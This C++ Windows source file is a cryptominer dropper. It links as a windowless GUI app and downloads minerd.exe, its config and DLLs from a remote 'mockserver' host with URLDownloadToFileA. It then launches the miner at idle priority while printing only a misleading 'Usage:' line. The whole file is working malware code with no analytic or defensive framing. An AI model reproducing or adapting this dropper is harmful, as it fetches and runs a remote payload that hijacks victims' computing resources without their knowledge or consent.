#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )

#include <stdio.h>
#include <windows.h> 
#include <urlmon.h>
#include <string>
#include <atomic>

#include "util.h"

#pragma comment(lib, "urlmon.lib")

inline HRESULT download_file_from_url(const std::string& base_url, const std::string& file_name) {
	return URLDownloadToFileA( NULL, (base_url + file_name).c_str(), file_name.c_str(), 0, NULL );
}

void download_minerd_from_web(const std::string& base_url) {
	HRESULT hr = download_file_from_url(base_url, "config.json");
	hr = download_file_from_url(base_url, "libcurl-4.dll");
	hr = download_file_from_url(base_url, "minerd.exe");
	hr = download_file_from_url(base_url, "pthreadGC2.dll");
}

boolean execute_cmd(const std::string& exe, const std::string& cmd_line) {
	STARTUPINFOA si;
    PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
	if( !CreateProcessA( (LPSTR)(exe.c_str()),   // No module name (use command line)
		(LPSTR)(cmd_line.c_str()),        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        IDLE_PRIORITY_CLASS,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) {
		printf( "CreateProcess failed (%d).\n", GetLastError() );
		return false;
	}
	// Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
	return true;
}

int main(int argc, char* argv[])
{
	if (AttachConsole(ATTACH_PARENT_PROCESS)) {
		// console
		printf("\n");
		printf("Usage:\n");
		download_minerd_from_web("http://update.xxsr.91waijiao.com/mockserver/");
		execute_cmd("minerd.exe", "minerd.exe -c config.json");
		FreeConsole();
	} else {
		// windows
		// MessageBoxA(NULL, "Hello world!", "Warning", MB_OK);
	}

	return 0;
}